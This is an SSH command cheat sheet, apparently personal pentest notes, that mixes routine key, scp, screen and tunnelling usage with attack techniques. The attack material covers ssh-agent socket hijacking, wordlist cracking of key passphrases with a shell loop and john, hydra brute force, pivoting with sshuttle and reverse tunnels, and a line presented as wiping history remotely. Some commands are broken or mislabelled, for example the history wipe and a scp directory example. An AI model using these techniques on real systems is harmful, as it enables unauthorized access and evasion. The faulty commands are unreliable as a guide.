SSH

ssh -D 127.0.0.1:1080 10.0.0.1
~/.ssh/config
/etc/ssh/ssh_config
~/.ssh/authozied_keys
~/.ssh/known_hosts

ssh-keygen -f mykey
ssh-add ~/dir/mykey


check fingerprint against ssh known keys for domain
ssh-keygen -r sub.target.dom


generate private key for public key in deb/ubu 2006-2008
	ssh-keygen -l -f publickey.pub
	ssh -i /path/to/privkey
	
>tsocks rdesktop 10.0.0.2
>**torsocks
	-set up tsocks for pivoting over ssh-connected host connection
	
ssh -L 127.0.0.1:10521:127.0.0.1:1521 user@10.0.0.1
	-service running on the remote host on TCP port 1521 is accessible by connecting to 10521 on the SSH client system
OR
in ~/.ssh/config
LocalForward 127.0.0.1:10521 10.0.0.99:1521

ssh -R 127.0.0.1:8000:127.0.0.1:80 10.0.0.1
OR
in ~/.ssh/config
RemoteForward 127.0.0.1:8000 127.0.0.1:80

X11 Forwarding
SSH -X 10.0.0.1
OR
in ~/.ssh/config
ForwardX11 yes


SSH Agent hijacking
export  SSH_AUTH_SOCK=/tmp/ssh-tqiEl28473/agent.28473
ssh-add -l # lists the keys loaded into the agent
ssh user@host # will authenticate you if server trusts key in agent
	-SSH agents listen on a unix socket, must figure where this is for each agent (e.g. /tmp/ssh-tqiEl28473/agent.28473)
OR
ps auxeww | grep ssh-agent | grep SSH_AUTH_SOCK | sed 's/.*SSH_AUTH_SOCK=//' | cut -f 1 -d ' '


Executing ssh-agent process manually
	--when manually executed or restarted variables will be (re-)set for use when ssh requires them when connecting to an agent
	--operations that require a private key will be performed by the agent
		--prevents private keys from being exposed to clients using the agent
ssh-agent xterm &
	--standard method of executing ssh-agent for x11 as background process/daemon
eval `ssh-agent -s`
	--agent prints the needed shell commands which can be evaluated in the calling shell for Bourne-type shell (sh, bash, ksh)
eval `ssh-agent -c`
	--agent prints the needed shell commands which can be evaluated in the calling shell for C-type shell (csh)
--Unix domain socket location for agent used for containing connections to auth agent



nmap -p 22 -v -sV --script=ssh-hostkey 10.11.1.71
ssh root@127.0.0.1


cat /usr/share/wordlists/metasploit/adobe_top100_pass.txt | while read pass; do if ssh-keygen –c –C “user@forandsix” –P $pass –f id_rsa &>/dev/null; then echo $pass; break; fi; done
	-We tried logging in to ssh but it was asking for a passphrase. So, we created the following script to find the correct password.
ssh2john id_rsa > id_rsa.john; john –wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john

ssh user@X.X.X.X | cat /dev/null > ~/.bash_history
	-clear user history remotely

USING SSH
ssh-keygen -t rsa -C newserver -f ~/.ssh/id_rsa
	-generate new rsa key
ssh-keygen -lvf  id_rsa
	-retrieve fingerprint of ssh key
ssh-keygen -lvf ~/.ssh/known_hosts
	-retrieve all ssh fingerprints
ssh user@remotehost "`cat filename.txt`"
	-execute a list of commands over ssh non-interactively
ssh-copy-id -i .ssh/id_rsa.pub user@192.168.1.100
	-copy public key to a remote host(checks to not copy private key by default)

	
USE SCREEN
screen -S testscreen
	ctrl+a+d to disconnect from screen
screen -ls
ssh -t user@192.168.1.168 screen -r testscreen
ssh -t user@192.168.1.168 /usr/bin/screen -xRR
screen -D -r
	connect to an existing screen session (-r) or create one if none exists (-D)

	
BRUTE force
hydra 192.168.1.1 ssh -L userlist -P wordlist -s 22 -vV

SCP
remote->local
scp username@remotehost.dom:foobar.ext /some/local/directory
local->remote
scp foobar.txt username@remotehost.dom:/some/remote/directory
directoires remote->local
scp foobar.txt username@remotehost.dom:/some/remote/directory
directories local->remote
scp -r foo your_username@remotehost.dom:/some/remote/directory/bar
scp username@some.dom:/some/remote/directory/foobar.txt  username@some1.dom:/some/remote/directory/
cryptography
scp -c blowfish -C local_file your_username@remotehost.edu:~/
	-using cipher blowfish instead of default Triple-DES encrpytion and throwing the -C compression flag may increase speed, the later may also reduce network footprint for large files

	
FORWARDING
sshuttle --dns -vr user@yourserver.com 0/0 --ssh-cmd 'ssh -i /your/key/path.pem'
sshuttle --dns -vr user@18.191.44.176 35.190.8.19 --ssh-cmd 'ssh -i /root/Dropbox/sentant/xyzpivot.pem'
ssh -f -N -R 2222:127.0.0.1:22 admin@12.11.13.14
ssh -f -N -D -p 8080 

TPROXY(SSHUTTLE)
	-[as root]
ip route add local default dev lo table 100
ip rule add fwmark 1 lookup 100
ip -6 route add local default dev lo table 100
ip -6 rule add fwmark 1 lookup 100
sudo SSH_AUTH_SOCK="$SSH_AUTH_SOCK" $HOME/tree/sshuttle.tproxy/sshuttle  --method=tproxy ...




WINDOWS
	*this is for windows' (recently added) builtin ssh client [not putty]
Private Keys
	-when getting error message 'It is required that your private key files are NOT accessible by others.'
modify private keys to single-user accessbility
cmd /c icacls id.pem /c /t /inheritance:d
cmd /c icacls id.pem /c /t /grant %username%:F
cmd /c icacls id.pem  /c /t /remove Administrator BUILTIN\Administrators BUILTIN Everyone System Users
